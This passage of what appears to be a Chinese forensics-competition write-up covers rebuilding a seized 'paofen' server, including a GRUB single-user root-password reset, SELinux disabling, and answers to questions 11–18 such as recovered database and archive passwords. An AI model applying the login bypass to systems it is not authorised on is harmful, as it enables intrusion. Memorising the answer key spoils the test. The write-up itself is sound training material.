src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107133329489.png" alt="image-20251107133329489"></p><p>重启之后发现ip没问题</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107133544734.png" alt="image-20251107133544734"></p><ul><li>启用虚拟化后就可以开启<code>web</code>服务的那个虚拟机了</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107133618644.png" alt="image-20251107133618644"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107133645029.png" alt="image-20251107133645029"></p><p>启动后需要按<code>e</code>键，进入单用户模式去改密码</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107134241927.png" alt="image-20251107134241927"></p><p>把这边都删除</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107134329357.png" alt="image-20251107134329357"></p><p>然后将<code>ro</code>变成<code>rw</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107134705351.png" alt="image-20251107134705351"></p><p>然后再添加这么一句，添加好后<code>ctrl+X</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107134829749.png" alt="image-20251107134829749"></p><p>然后登录界面后输入如下指令<code>chroot /sysroot</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107135045235.png" alt="image-20251107135045235"></p><p>然后还要修改这个文件</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107135232615.png" alt="image-20251107135232615"></p><p>这个文件这边是<code>enforcing</code>，我们要将它变成<code>disabled</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107135316764.png" alt="image-20251107135316764"></p><p>最后就是修改密码，也就是修改<code>/etc/passwd</code>文件</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107135529056.png" alt="image-20251107135529056"></p><p>先将root默认运行的终端改为<code>bin/bash</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107135607563.png" alt="image-20251107135607563"></p><p>然后再使用<code>passwd</code>命令修改密码，新密码为<code>123456</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107135653400.png" alt="image-20251107135653400"></p><p>修改完之后重新启动</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107135751839.png" alt="image-20251107135751839"></p><p>修改配置之后要等一会儿才能重启服务器，在等待的过程中可以先修改<code>db</code>服务器的密码。</p><h2 id="网站重构改db服务器密码"><a href="#网站重构改db服务器密码" class="headerlink" title="网站重构改db服务器密码"></a>网站重构改db服务器密码</h2><p>该db服务器密码也是和前面一样的。操作这里就不详细说明了。</p><h2 id="ssh远程连接"><a href="#ssh远程连接" class="headerlink" title="ssh远程连接"></a>ssh远程连接</h2><p>现在直接使用<code>mobax</code>连接web服务器</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107143718893.png" alt="image-20251107143718893"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107143848963.png" alt="image-20251107143848963"></p><p>进入db服务器，查看其ip地址与ssh端口，也使用<code>moba</code>远程连接</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107151931801.png" alt="image-20251107151931801"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107151954584.png" alt="image-20251107151954584"></p><h2 id="挂载目录"><a href="#挂载目录" class="headerlink" title="挂载目录"></a>挂载目录</h2><ul><li>接下来回到<code>web</code>服务器那边，发现www目录没有东西，由于这是nas服务器，所以可能很多东西都存在nas盘中</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107152221739.png" alt="image-20251107152221739"></p><ul><li>这个时候我们先需要看<code>NAS</code>的这个<code>iSCSI</code>服务开启，开启后我们需要重启一下<code>web</code>的虚拟机（最好db服务器也重启一下，因为现在不重启后面重构网站的时候也要重启的。）</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107152607316.png" alt="image-20251107152607316"></p><p>重启完之后就会发现有一个<code>sdb</code>和<code>sdb1</code>是新出现的盘符</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107153254390.png" alt="image-20251107153254390"></p><p>接下来就是挂载盘符，使用<code>mount /dev/sdb1 /www</code>命令，然后再进入<code>www</code>就会看到有文件了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107153640473.png" alt="image-20251107153640473"></p><h2 id="question11"><a href="#question11√-2" class="headerlink" title="question11√"></a>question11√</h2><p>请分析服务器，给出redis所使用的配置文件？[答案格式:/home/1.conf]</p><p>进入web服务器后就可以看到<code>redis</code>服务器所使用的配置文件位置<code>/etc/redis.conf</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107142400522.png" alt="image-20251107142400522"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/redis.conf</span><br></pre></td></tr></table></figure><ul><li>如果要是不知道目录的话直接使用<code>find</code>命令从根目录开始寻找名字</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107153817475.png" alt="image-20251107153817475"></p><ul><li>如果不知道<code>redis.conf</code>的后缀就直接使用正则表达式find</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107153938715.png" alt="image-20251107153938715"></p><h2 id="question12"><a href="#question12√-2" class="headerlink" title="question12√"></a>question12√</h2><p>请分析服务器，给出跑分网站后台根目录？[答案格式:/xx/xx]</p><p>这个需要直接看中间件<code>nginx</code>的配置文件，在<code>/etc/nginx/conf.d</code>是<code>nginx</code>中网站的配置文件</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107154522096.png" alt="image-20251107154522096"></p><p>题目说是后台根目录，所以需要看的是<code>admin.paofen.con.conf</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107154646608.png" alt="image-20251107154646608"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/www/admin.paofen.com/public</span><br></pre></td></tr></table></figure><h2 id="question13"><a href="#question13√-2" class="headerlink" title="question13√"></a>question13√</h2><p>请分析服务器，嫌疑人所使用的跑分系统可能来自哪，请给出网站？[答案格式:www.baidu.com]</p><p>这个就需要分析跑分网站的源码，才能知道框架之类的最终确定出处，进入到<code>/www/admin.paofen.com/app</code>，找到<code>config.php</code>文件，该文件配置网站的时候是一定要修改的，所以很大可能会宣传什么东西或者声明版权之类的。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107155030757.png" alt="image-20251107155030757"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.98sucai.com</span><br></pre></td></tr></table></figure><h2 id="question14"><a href="#question14√-1" class="headerlink" title="question14√"></a>question14√</h2><p>请分析服务器，给出数据库root账号密码？[答案格式:password]</p><p>这题就需要去翻找数据库服务器了，在查看数据库服务器的时候就会发现一个<code>backup.sh</code>的<code>shell</code>脚本文件，但是打开这个文件发现是乱码，这个脚本文件被加密了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107155723539.png" alt="image-20251107155723539"></p><p>而这个被加密后变成了一个自解压运行运行的一个<code>shell</code>脚本文件，其实我们在前面的这个sh文件的前面的内容就能看出，加密它的软件是<code>gzexe</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107160010618.png" alt="image-20251107160010618"></p><p>所以我们需要使用<code>gzexe -d backup.sh</code>命令进行解密操作，这样就能看到原来的<code>shell里面的内容</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107160058100.png" alt="image-20251107160058100"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3W.pa0fen.com</span><br></pre></td></tr></table></figure><h2 id="question15"><a href="#question15√-1" class="headerlink" title="question15√"></a>question15√</h2><p>请分析服务器，给出数据库备份文件存放路径？[答案格式:/xx/xxx]</p><p>这个是个细节题，因为如果纯去找的话是找不到的，应该认真看上面的解密<code>shell脚本</code>的内容，这个时候就会发现备份路径也是在<code>shell</code>脚本中的</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107160803761.png" alt="image-20251107160803761"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/mysql_back</span><br></pre></td></tr></table></figure><ul><li>如果去翻找<code>data</code>目录的话发现是没东西的</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107160838939.png" alt="image-20251107160838939"></p><h2 id="question16"><a href="#question16√-1" class="headerlink" title="question16√"></a>question16√</h2><p>请分析服务器，给出数据库备份文件解压密码？[答案格式:password]</p><p>还是继续看这个<code>shell</code>脚本的具体内容，就会发现有一个这个命令</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107161012687.png" alt="image-20251107161012687"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p@ssw0rd</span><br></pre></td></tr></table></figure><h2 id="question17"><a href="#question17√" class="headerlink" title="question17√"></a>question17√</h2><p>请分析服务器，给出数据库备份文件间隔多少天会删除？[答案格式:1]</p><p>还是继续看<code>shell</code>脚本文件，在开头有指定备份天数为<code>45</code>天</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107161146702.png" alt="image-20251107161146702"></p><h2 id="question18"><a href="#question18√" class="headerlink" title="question18√"></a>question18√</h2><p>请分析服务器，给出数据库每天几点会执行备份操作？[答案格式:00:00]</p><p>这个时候就需要查看计划任务，看shell脚本没用了。看计划任务就会知道什么时候操作系统会执行<code>shell</code>，看计划任务的命令为：<code>crontab -l</code>，查看后就会发现</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107161510551.png" alt="image-20251107161510551"></p><p>但是发现看不来格式，所以直接问AI了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107161624185.png" alt="image-20251107161624185"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">02:00</span><br></pre></td></tr></table></figure><h2 id="重构web网站1"><a href="#重构web网站1" class="headerlink" title="重构web网站1"></a>重构web网站1</h2><p>接下来就要把web网站重构起来，先看看<code>nginx</code>等一些中间件服务有没已经在运行了，发现并没有。那启这个网站就要一个一个服务起起来了，而不是只需要开个web服务就能用网站了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107184953439.png" alt="image-20251107184953439"></p><p>先开启<code>nginx</code>服务</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107185120698.png" alt="image-20251107185120698"></p><p>接下来启动php服务</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107185314303.png" alt="image-20251107185314303"></p><p>接下来打开php的fpm服务</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107185423387.png" alt="image-20251107185423387"></p><p>进入<code>www</code>文件目录，然后修改文件的初始组</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107185613172.png" alt="image-20251107185613172"></p><p>然后进入<code>redis</code>日志文件目录下<code>cd /var/log/redis</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107185712773.png" alt="image-20251107185712773"></p><p>继续修改初始组，修改完成之后启动<code>redis</code>服务</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107185837526.png" alt="image-20251107185837526"></p><p>然后修改<code>php</code>的一些配置文件，主要是将web服务于<code>数据库</code>连接起来，在这个目录下找到<code>database.php</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107190034625.png" alt="image-20251107190034625"></p><p>查看<code>database.php</code>后发现是这样的一个服务器地址，将其修改为数据库服务器的<code>ip</code>地址</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107190121149.png" alt="image-20251107190121149"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107190152177.png" alt="image-20251107190152177"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107190242424.png" alt="image-20251107190242424"></p><p>然后再查看数据库服务器的那个端口和密码，将端口和密码都修改了，数据库名应该也有问题</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107190443552.png" alt="image-20251107190443552"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107190611614.png" alt="image-20251107190611614"></p><p>全修改完之后如下所示</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107190634602.png" alt="image-20251107190634602"></p><p>这里我之前没有重启，导致<code>db</code>服务器没有挂载<code>nas</code>的盘，导致有些数据加载不出来。所以要重启一下，重启之后发现有<code>sdb1</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107191858434.png" 